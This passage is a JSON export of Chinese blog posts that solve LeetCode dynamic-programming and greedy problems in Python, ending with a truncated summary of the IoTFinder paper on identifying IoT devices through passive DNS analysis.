空间复杂度：O(1)。我们只需要常数的空间保存若干变量。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"【数据结构与算法】【LeetCode】【贪心算法】455.分发饼干","slug":"LeetCode-D-贪心算法-455. 分发饼干","date":"2020-12-28T16:00:00.000Z","updated":"2020-12-29T11:28:54.009Z","comments":true,"path":"2020/12/29/LeetCode-D-贪心算法-455. 分发饼干/","link":"","permalink":"https://fishni.github.io/2020/12/29/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-455.%20%E5%88%86%E5%8F%91%E9%A5%BC%E5%B9%B2/","excerpt":"贪心策略、分配问题","text":"贪心策略、分配问题 题目假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。 对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j分配给孩子 i，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。 示例1： 输入: g = [1,2,3], s = [1,1] 输出: 1 解释: 你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。 虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。 所以你应该输出1。示例2： 输入: g = [1,2], s = [1,2,3] 输出: 2 解释: 你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。 你拥有的饼干数量和尺寸都足以让所有孩子满足。 所以你应该输出2.提示： $1 &lt;= g.length &lt;= 3 * 10^4$ $0 &lt;= s.length &lt;= 3 * 10^4$ $1 &lt;= g[i], s[j] &lt;= 2^{31} - 1$ 题解贪心策略是，给剩余孩子里最小饥饿度的孩子分配最小的能饱腹的饼干。至于具体实现，因为我们需要获得大小关系，一个便捷的方法就是把孩子和饼干分别排序。这样我们就可以从饥饿度最小的孩子和大小最小的饼干出发，计算有多少个对子可以满足条件。 1234567891011121314151617181920class Solution: def findContentChildren(self, g, s) -&gt; int: new_g=sorted(g) new_s=sorted(s) i=0 j=0 sum=0 while True: if j&lt;len(new_s) and i&lt;len(new_g): if new_s[j]&gt;=new_g[i]: sum+=1 j = j+1 i = i+1 else: j=j+1 else: break return sum 1234g=[10,9,8,7]s=[5,6,7,8]a=Solution()a.findContentChildren(g,s) 2123456789101112131415161718class Solution: def findContentChildren(self, g, s) -&gt; int: new_g=sorted(g) new_s=sorted(s) ng = len(new_g) ns = len(new_s) i=j = 0 sum=0 while i&lt;ng and j&lt;ns: while j&lt;ns and new_g[i]&gt;new_s[j]: j =j+1 if j &lt; ns: sum += 1 i += 1 j += 1 return sum 1234g=[10,9,8,7]s=[5,6,7,8]a=Solution()a.findContentChildren(g,s) 2","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】416.分割等和子集","slug":"LeetCode-C-动态规划-416. 分割等和子集","date":"2020-12-24T16:00:00.000Z","updated":"2020-12-25T11:58:31.537Z","comments":true,"path":"2020/12/25/LeetCode-C-动态规划-416. 分割等和子集/","link":"","permalink":"https://fishni.github.io/2020/12/25/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-416.%20%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/","excerpt":"0-1背包问题思想、二维数组、滚动数组","text":"0-1背包问题思想、二维数组、滚动数组 题目给定一个只包含正整数的非空数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。 注意: 每个数组中的元素不会超过 100 数组的大小不会超过 200示例1： 输入: [1, 5, 11, 5] 输出: true 解释: 数组可以分割成 [1, 5, 5] 和 [11].示例2： 输入: [1, 2, 3, 5] 输出: false 解释: 数组不能分割成两个元素和相等的子集.题解转换为0-1背包问题「0 - 1」 背包问题的思路 0-1背包问题特点：每个数只能用一次。解决思路：物品一个一个选 ，容量一点一点增加考虑，这也是【动态规划】的思想，特别重要 实际上，尝试把候选物品放入背包，通过比较得出一个物品要不要拿走。 具体做法：具体做法是：画一个 n 行，target + 1 列的表格。这里 n 是物品的个数，target 是背包的容量。n 行表示一个一个物品考虑，target + 1多出来的那 1 列，表示背包容量从 0 开始考虑。很多时候，我们需要考虑这个容量为 0 的数值。 状态与状态转移方程 状态定义：dp[i][j]表示从数组的[0, i]这个子区间内挑选一些正整数，每个数只能用一次，使得这些数的和恰好等于 j。 状态转移方程：很多时候，状态转移方程思考的角度是「分类讨论」，对于「0-1 背包问题」而言就是「当前考虑到的数字选与不选」。 不选择 nums[i]，如果在[0, i - 1]这个子区间内已经有一部分元素，使得它们的和为j，那么 dp[i][j] = true 选择nums[i]，如果在 [0, i - 1]这个子区间内就得找到一部分元素，使得它们的和为 j - nums[i] 状态转移方程： dp[i][j] = dp[i - 1][j] or dp[i - 1][j - nums[i]] 一般写出状态转移方程以后，就需要考虑初始化条件。 j - nums[i]作为数组的下标，一定得保证大于等于 0 ，因此 nums[i] &lt;= j 注意到一种非常特殊的情况：j 恰好等于 nums[i]，即单独 nums[j] 这个数恰好等于此时「背包的容积」j，这也是符合题意的。 因此完整的状态转移方程是： $$ dp[i][j]= \\begin{cases} dp[i-1][j],\\quad 至少是这个答案，如果dp[i-1][j]为真，直接计算下一个状态\\ true, \\quad nums[i]=j\\dp[i-1][j-nums[i]] \\quad nums[i]&lt;j\\end{cases} \\tag{1} $$ 说明：虽然写成花括号，但是它们的关系是 或者 初始化：dp[0][0] = false，因为候选数 nums[0]是正整数，凑不出和为 0； 输出：dp[n - 1][target]，这里n 表示数组的长度，target是数组的元素之和（必须是偶数）的一半。 12345678910111213141516171819202122232425262728293031323334class Solution: def canPartition(self, nums) -&gt; bool: # 空的or长度为1,直接返回false if len(nums)&lt;=1: return False # 若集合中元素和为奇数，直接返回false sum=0 for i in nums: sum+=i if sum%2==1: return False # 处理集合元素和为偶数情况 n= len(nums) target = sum//2 # 创建二维状态数组，行：物品索引，列：容量（包括 0） dp = [[False] * (target + 1) for _ in range(n)] #先填表格第 0 行，第 1 个数只能让容积为它自己的背包恰好装满 if nums[0] &lt;=target: dp[0][nums[0]] = True for i in range(1,n): for j in range(target+1): #dp[i][j] = dp[i - 1][j]# 直接从上一行先把结果抄下来，然后再修正 if nums[i]==j: dp[i][j]=True continue if nums[i]&lt;j: dp[i][j]= dp[i-1][j] or dp[i-1][j-nums[i]] return dp[n-1][target] 1234a=Solution()nums=[1,2,5]result=a.canPartition(nums)print(result) False target=4 3 行 5列 0 1 2 3 4 1 0 F T F F F 2 1 F T T T F 5 2 F T T T F复杂度分析 时间复杂度：O(NC)：这里 N 是数组元素的个数，C 是数组元素的和的一半。 空间复杂度：O(NC)。 空间优化，一维数组「0-1 背包问题」常规优化：「状态数组」从二维降到一维，减少空间复杂度。 在「填表格」的时候，当前行只参考了上一行的值，因此状态数组可以只设置 2 行，使用「滚动数组」的技巧「填表格」即可； 实际上，在「滚动数组」的基础上还可以优化，在「填表格」的时候，当前行总是参考了它上面一行 「头顶上」 那个位置和「左上角」某个位置的值。因此，我们可以只开一个一维数组，从后向前依次填表即可。 「从后向前」 写的过程中，一旦 nums[i] &lt;= j不满足，可以马上退出当前循环，因为后面的 j 的值肯定越来越小，没有必要继续做判断，直接进入外层循环的下一层。相当于也是一个剪枝，这一点是「从前向后」填表所不具备的。 1234567891011121314151617181920212223242526class Solution: def canPartition(self, nums) -&gt; bool: if len(nums)&lt;=1: return False sum= 0 for i in nums: sum+=i if sum%2==1: return False n= len(nums) target= sum//2 dp=[False]*(target+1) dp[0]=True if nums[0]&lt;=target: dp[nums[0]]=True for i in range(1,n): for j in range(target,0,-1): if dp[target]: return True if nums[i]&gt;j: break dp[j]= dp[j] or dp[j-nums[i]] return dp[target] 1234a=Solution()nums=[1,2,4,5]result=a.canPartition(nums)print(result) True复杂度分析 时间复杂度：O(NC)：这里 N 是数组元素的个数，C 是数组元素的和的一半； 空间复杂度：O(C)：减少了物品那个维度，无论来多少个数，用一行表示状态就够了","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】322.零钱兑换","slug":"LeetCode-C-动态规划-322. 零钱兑换","date":"2020-12-21T16:00:00.000Z","updated":"2020-12-23T02:10:19.176Z","comments":true,"path":"2020/12/22/LeetCode-C-动态规划-322. 零钱兑换/","link":"","permalink":"https://fishni.github.io/2020/12/22/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-322.%20%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2/","excerpt":"dp、贪心、dfs","text":"dp、贪心、dfs 题目给定不同面额的硬币coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 -1。 你可以认为每种硬币的数量是无限的。 示例1： 输入：coins = [1, 2, 5], amount = 11 输出：3 解释：11 = 5 + 5 + 1示例2： 输入：coins = [2], amount = 3 输出：-1示例3： 输入：coins = [1], amount = 0 输出：0示例4： 输入：coins = [1], amount = 1 输出：1示例5： 输入：coins = [1], amount = 2 输出：2提示：$1 &lt;= coins.length &lt;= 12\\1 &lt;= coins[i] &lt;= 2^{31}- 1\\0 &lt;= amount &lt;= 10^4$ 题解方法一:二维数组1234567891011121314151617181920class Solution: def coinChange(self, coins, amount) -&gt; int: if amount &lt; 0: return - 1 dp = [[amount + 1 for _ in range(len(coins) + 1)] for _ in range(amount + 1)] # 初始化第一行为0，其他为最大值（也就是amount + 1） for j in range(len(coins) + 1): dp[0][j] = 0 for i in range(1, amount + 1): for j in range(1, len(coins) + 1): if i - coins[j - 1] &gt;= 0: dp[i][j] = min( dp[i][j - 1], dp[i - coins[j - 1]][j] + 1) else: dp[i][j] = dp[i][j - 1] return -1 if dp[-1][-1] == amount + 1 else dp[-1][-1] 12345a=Solution()coins = [1, 2, 5]amount = 11result =a.coinChange(coins,amount)print(result) 3复杂度分析 时间复杂度：O(amonut∗len(coins)) 空间复杂度：O(amount * len(coins)) dp[i][j] 依赖于dp[i][j - 1]和 dp[i - coins[j - 1]][j] + 1)这是一个优化的信号，我们可以将其优化到一维,具体见下方。 方法二：一维数组自上而下（动态规划）转移方程： F(S)表示组成金额S的最少硬币数，最后一枚硬币值为C，则最优子结构为$$F(S)=F(S-C)+1$$ 不能确定最后一枚硬币，故枚举每个硬币值$c_0,c_1,c_2,\\cdots,c_{n-1}$，选择最小值。递推关系如下：$$F(S)=min_{i=0,..,n-1}{F(S-c_i)+1}，S-c_i\\geq0 \\F(S)=0,S=0\\F(S)=-1,n=0$$ 自下而上（动态规划）思路分析 动态规划 子问题 用 dp[i] 来表示组成 i 块钱，需要最少的硬币数，那么 第 j 个硬币我可以选择不拿 这个时候， 硬币数 = dp[i] 第 j 个硬币我可以选择拿 这个时候， 硬币数 = dp[i - coins[j]] + 1 和背包问题不同， 硬币是可以拿任意个 对于每一个 dp[i] 我们都选择遍历一遍 coin， 不断更新 dp[i] 状态转移方程 仍定义 F(i) 为组成金额 i 所需最少的硬币数量，假设在计算 F(i) 之前，我们已经计算出 F(0)-F(i-1) 的答案。 则 F(i) 对应的转移方程应为$$F(i)=min_{j=0…n}F(i-c_j)+1$$ 示例 coins = [1, 2, 3], amount = 6 在上图可看到：$F(3)=min((F(3-c_1),F(3,c_2),F(3-c_3))+1$$=min(F(3-1),F(3-2),F(3-3))+1$ $=min(F(2),F(1),F(0))+1$$=min(1,1,0)+1$$=1$ 123456789101112class Solution: def coinChange(self, coins, amount) -&gt; int: dp = [amount + 1] * (amount + 1) dp[0] = 0 for i in range(1, amount + 1): for j in range(len(coins)): if i &gt;= coins[j]: dp[i] = min(dp[i], dp[i - coins[j]] + 1) return -1 if dp[-1] == amount + 1 else dp[-1] 12345a=Solution()coins = [1, 2, 5]amount = 11result =a.coinChange(coins,amount)print(result) 3复杂度 时间复杂度：O(amonut * len(coins)) 空间复杂度：O(amount) 方法三：贪心 + dfs思路分析 贪心 想要总硬币数最少，肯定是优先用大面值硬币，所以对 coins 按从大到小排序 先丢大硬币，再丢会超过总额时，就可以递归下一层丢的是稍小面值的硬币 乘法对加法的加速 优先丢大硬币进去尝试，也没必要一个一个丢，可以用乘法算一下最多能丢几个 k = amount / coins[c_index] 计算最大能投几个 amount - k * coins[c_index] 减去扔了 k 个硬币 count + k 加 k 个硬币 如果因为丢多了导致最后无法凑出总额，再回溯减少大硬币数量 最先找到的并不是最优解 注意不是现实中发行的硬币，面值组合规划合理，会有奇葩情况 考虑到有 [1,7,10] 这种用例，按照贪心思路 10 + 1 + 1 + 1 + 1 会比 7 + 7 更早找到 所以还是需要把所有情况都递归完 ans 疯狂剪枝 贪心虽然得不到最优解，但也不是没用的 我们快速算出一个贪心的 ans 之后，虽然还会有奇葩情况，但是绝大部分普通情况就可以疯狂剪枝了 1234567891011121314151617class Solution(): def coinChange(self, coins, amount): def coinChanging(coins, amount, c_index, count, ans): if amount == 0: return min(ans, count) if c_index == len(coins): return ans k = amount // coins[c_index] while k &gt;= 0 and k + count &lt; ans: ans = coinChanging(coins, amount - k * coins[c_index], c_index + 1, count + k, ans) k -= 1 return ans if amount == 0: return 0 coins.sort(reverse=True) ans = coinChanging(coins, amount, 0, 0, float('inf')) return ans if ans != float('inf') else -1 12345a=Solution()coins = [1, 2, 5]amount = 11result =a.coinChange(coins,amount)print(result) 3","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】309.最佳买卖股票时机含冷冻期","slug":"LeetCode-C-动态规划-309. 最佳买卖股票时机含冷冻期","date":"2020-12-19T16:00:00.000Z","updated":"2020-12-20T06:23:46.626Z","comments":true,"path":"2020/12/20/LeetCode-C-动态规划-309. 最佳买卖股票时机含冷冻期/","link":"","permalink":"https://fishni.github.io/2020/12/20/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-309.%20%E6%9C%80%E4%BD%B3%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E6%97%B6%E6%9C%BA%E5%90%AB%E5%86%B7%E5%86%BB%E6%9C%9F/","excerpt":"dp组","text":"dp组 题目给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。 设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。 示例 输入: [1,2,3,0,2] 输出: 3 解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]题解这是一道典型的 DP 问题， DP 问题的核心是找到状态和状态转移方程。 这道题目的状态似乎比我们常见的那种 DP 问题要多，这里的状态有 buy sell cooldown 三种， 我们可以用三个数组来表示这这三个状态，buy,sell, cooldown buy[i]表示第 i 天，且以 buy 结尾的最大利润 sell[i]表示第 i 天，且以 sell 结尾的最大利润 cooldown[i]表示第 i 天，且以 sell 结尾的最大利润 我们思考一下，其实 cooldown 这个状态数组似乎没有什么用，因此 cooldown 不会对profit产生 任何影响。 我们可以进一步缩小为两种状态。 buy[i] 表示第 i 天，且以 buy 或者 coolwown 结尾的最大利润 sell[i] 表示第 i 天，且以 sell 或者 cooldown 结尾的最大利润 对应的状态转移方程如下： buy[i] = max(buy[i - 1], sell[i - 2] - prices[i]) sell[i] =max(sell[i - 1], buy[i - 1] + prices[i])分析：buy[i]对应第 i 的 action 只能是 buy 或者 cooldown。 如果是 cooldown，那么 profit 就是 buy[i - 1] 如果是 buy，那么就是前一个卖的profit减去今天买股票花的钱，即 sell[i -2] - prices[i] 注意这里是 i - 2，不是 i-1 ，因为有 cooldown 的限制 sell[i]对应第 i 的 action 只能是 sell 或者 cooldown 如果是 cooldown，那么 profit 就是 sell[i - 1] 如果是 sell，那么就是前一次买的时候获取的利润加上这次卖的钱，即 buy[i - 1] + prices[i] 123456789101112131415161718192021class Solution: def maxProfit(self, prices) -&gt; int: if prices==None or len(prices)&lt;=1: return 0 n=len(prices) # 定义状态变量 buy=[0]*n sell=[0]*n # buy[0]=-prices[0] buy[1]=max(-prices[0],-prices[1]) sell[0]=0 sell[1]=max(0,prices[1]-prices[0]) for i in range(2,n): #状态转移方程 # 第i天只能是买或者cooldown buy[i]=max(buy[i-1],sell[i-2]-prices[i]) sell[i]=max(sell[i-1],buy[i-1]+prices[i]) return max(buy[-1],sell[-1]) 123a= Solution()prices=[1,2,3,0,2]a.maxProfit(prices) 3","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】198.打家劫舍","slug":"LeetCode-C-动态规划-198. 打家劫舍","date":"2020-12-15T16:00:00.000Z","updated":"2020-12-16T02:22:07.558Z","comments":true,"path":"2020/12/16/LeetCode-C-动态规划-198. 打家劫舍/","link":"","permalink":"https://fishni.github.io/2020/12/16/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-198.%20%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/","excerpt":"dp数组，滚动数组","text":"dp数组，滚动数组 题目你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。 给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。 示例1： 输入：[1,2,3,1] 输出：4 解释：偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。 偷窃到的最高金额 = 1 + 3 = 4 。示例2： 输入：[2,7,9,3,1] 输出：12 解释：偷窃 1 号房屋 (金额 = 2), 偷窃 3 号房屋 (金额 = 9)，接着偷窃 5 号房屋 (金额 = 1)。 偷窃到的最高金额 = 2 + 9 + 1 = 12 。提示： 0 &lt;= nums.length &lt;= 100 0 &lt;= nums[i] &lt;= 400题解方法一：动态规划 + dp数组思路与算法分析 若只有一间房，则偷窃该房间 若有两间房，只能偷一间，故偷两者之间金额最高的 若房间数为$k(&gt;2)$ 偷窃第 k间房屋，那么就不能偷窃第 k-1 间房屋，偷窃总金额为前 k−2 间房屋的最高总金额与第 k间房屋的金额之和。 不偷窃第 k 间房屋，偷窃总金额为前 k−1 间房屋的最高总金额。 在两个选项中选择偷窃总金额较大的选项，该选项对应的偷窃总金额即为前 kk 间房屋能偷窃到的最高总金额。 用dp[i]表示前i间房屋能偷到的最高金额，则状态转移方程：$$dp[i]=max(dp[i-2)+nums[i],dp[i-1])$$边界条件为$$ y= \\begin{cases} dp[0]=nums[0],\\quad 只有一间房屋，则偷窃该房屋 \\ dp[1]=max(nums[0],nums[1]), \\quad 只有两间房屋 \\end{cases} $$最终的答案即为dp[n-1]，其中n是数组的长度 复杂度分析 时间复杂度O(n) 空间复杂度O(n) 123456789101112131415161718class Solution: def rob(self, nums) -&gt; int: if len(nums)==0: return 0 if len(nums)==1: return nums[0] if len(nums)==2: return max(nums[0],nums[1]) n= len(nums) dp=[0]*len(nums) dp[0]=nums[0] dp[1]=max(nums[0],nums[1]) for i in range(2,n): dp[i]=max(dp[i-2]+nums[i],dp[i-1]) return dp[-1] 1234nums=[2,7,9,3,1]a=Solution()result=a.rob(nums)print(result) 12方法二：滚动数组通过两个单变量，时间复杂度为O(n)，空间复杂度为O(1) 1234567891011121314class Solution: def rob(self, nums) -&gt; int: if not nums: return 0 size = len(nums) if size == 1: return nums[0] first, second = nums[0], max(nums[0], nums[1]) for i in range(2, size): first, second = second, max(first + nums[i], second) return second 1234nums=[2,7,9,3,1]a1=Solution()result=a1.rob(nums)print(result) 12","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】139.单词拆分","slug":"LeetCode-C-动态规划-139. 单词拆分","date":"2020-12-14T16:00:00.000Z","updated":"2020-12-15T02:31:38.917Z","comments":true,"path":"2020/12/15/LeetCode-C-动态规划-139. 单词拆分/","link":"","permalink":"https://fishni.github.io/2020/12/15/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-139.%20%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/","excerpt":"dp数组，记忆化数组","text":"dp数组，记忆化数组 题目给定一个非空字符串 s 和一个包含非空单词的列表 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。 说明： 拆分时可以重复使用字典中的单词。 你可以假设字典中没有重复的单词。 示例 1： 输入: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;] 输出: true 解释: 返回 true 因为 &quot;leetcode&quot; 可以被拆分成 &quot;leet code&quot;。示例 2： 输入: s = &quot;applepenapple&quot;, wordDict = [&quot;apple&quot;, &quot;pen&quot;] 输出: true 解释: 返回 true 因为 &quot;applepenapple&quot; 可以被拆分成 &quot;apple pen apple&quot;。 注意你可以重复使用字典中的单词。示例3： 输入: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;, &quot;dog&quot;, &quot;sand&quot;, &quot;and&quot;, &quot;cat&quot;] 输出: false题解方法一：动态规划思路和算法 初始化 $dp=[False,\\cdots,False]$，长度为 n+1。n 为字符串长度。$dp[i]$ 表示 s 的前 i 位是否可以用 wordDict中的单词表示。 初始化 $dp[0]=True$，空字符可以被表示。 遍历字符串的所有子串，遍历开始索引 i，遍历区间$ [0,n)$： 遍历结束索引 j，遍历区间 $[i+1,n+1)$： 若 $dp[i]=True$且 $s[i,\\cdots,j)$ 在 wordlist 中：$dp[j]=True$ 解释：$dp[i]=True$说明s 的前 i位可以用 wordDict 表示，则$ s[i,\\cdots,j)$出现在 wordDict 中，说明 s 的前 j位可以表示。 返回 $dp[n]$ 复杂度分析 时间复杂度：$O(n^2)$ 空间复杂度：$O(n)$ 1234567891011class Solution: def wordBreak(self, s: str, wordDict) -&gt; bool: n=len(s) dp=[False]*(n+1) # 初始化n+1个false dp[0]=True # 空字符可以被表示 for i in range(n): for j in range(i+1,n+1): if dp[i] and s[i:j] in wordDict: dp[j]=True #print(dp) return dp[-1] 12345a= Solution()s = \"leetcode\"wordDict = [\"leet\", \"code\"]result=a.wordBreak(s,wordDict)print(result) True12345a= Solution()s = \"applepenapple\"wordDict = [\"apple\", \"pen\"]result=a.wordBreak(s,wordDict)print(result) True12345a= Solution()s = \"catsandog\"wordDict = [\"cats\", \"dog\", \"sand\", \"and\", \"cat\"]result=a.wordBreak(s,wordDict)print(result) [True, False, False, True, True, False, False, True, False, False] False方法二：记忆化回溯 使用记忆化函数，保存出现过的 backtrack(s)，避免重复计算。 定义回溯函数 backtrack(s) 若 s 长度为 0，则返回 True，表示已经使用 wordDict中的单词分割完。 初始化当前字符串是否可以被分割 res=False 遍历结束索引 i，遍历区间 [1,n+1)： 若 $s[0,\\cdots,i-1]$在 wordDict中：$res=backtrack(s[i,\\cdots,n-1])\\ or\\ res$。 解释：保存遍历结束索引中，可以使字符串切割完成的情况。 返回 resres 返回 backtrack(s) 12345678910111213141516171819class Solution: def wordBreak(self, s: str, wordDict) -&gt; bool: import functools @functools.lru_cache(None) def back_track(s): if(not s): return True res=False for i in range(1,len(s)+1): if(s[:i] in wordDict): res=back_track(s[i:]) or res return res return back_track(s)a= Solution()s = \"catsandog\"wordDict = [\"cats\", \"dog\", \"sand\", \"and\", \"cat\"]result=a.wordBreak(s,wordDict)print(result) False","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【PapersReading】通过被动DNS流量分析识别大规模IoT设备","slug":"Paper-01-论文阅读","date":"2020-12-12T16:00:00.000Z","updated":"2020-12-14T01:50:04.209Z","comments":true,"path":"2020/12/13/Paper-01-论文阅读/","link":"","permalink":"https://fishni.github.io/2020/12/13/Paper-01-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"见下文。","text":"见下文。 论文IoTFinder: Efficient Large-Scale Identification of IoT Devices via Passive DNS Traffic Analysis September 7-11, 2020 (all-digital event)5th IEEE European Symposium on Security and Privacy 这是一篇S&amp;P上收录的论文 论文摘要 本文要解决问题 识别潜在的易受攻击的IoT设备 解决方案 提出一个IoTFinder系统，通过被动DNS流量分析，能够大规模、高效的识别IoT设备 数据收集：收集分布式被动DNS数据 该系统基于机器学习 仅基于DNS指纹识别IoT设备 识别的广泛性：该系统不论IoT设备处于NAT下，其他中间盒、还是分配了IP4或IP6地址，也能进行识别 IoTFinder 多标签分类器 本文通过不同设置评估了其分类的准确性 不同的DNS流量数据 实验结果表明，即使将它们托管在NAT之后并且其流量与由同一本地网络中托管的其他IoT和非IoT设备生成的流量“混合”在一起，我们的方法也可以准确地检测许多不同的IoT设备。 本文主要关于： IoT安全 流量模型 被动DNS B相关知识学习被动DNS（Passive DNS）https://developer.aliyun.com/article/764940 https://securitytrails.com/blog/passive-dns https://xz.aliyun.com/t/5991 DNS：域名与IP地址相互映射的分布式数据库 域名解析：通过域名获取IP地址的过程 被动DNS: 与传统的DNS（实时系统需要查询DNS服务器和解析器以将主机名转换为IP地址）不同，被动DNS的工作方式却相反。这意味着始终存在一个DNS数据库，用于存储DNS记录，IP地址查找以及有关与通用DNS通信中涉及的域，服务器和IP地址有关的所有内容的统计信息。此信息将保存在安全的数据库中，以供以后分析，该数据库会将实时DNS结果转换为被动DNS数据。 顾名思义，也即通过被动获取DNS数据（在互联网中，通过流量抓取工具获取DNS数据），这些数据被存储到一个中央安全数据库，形式Passive 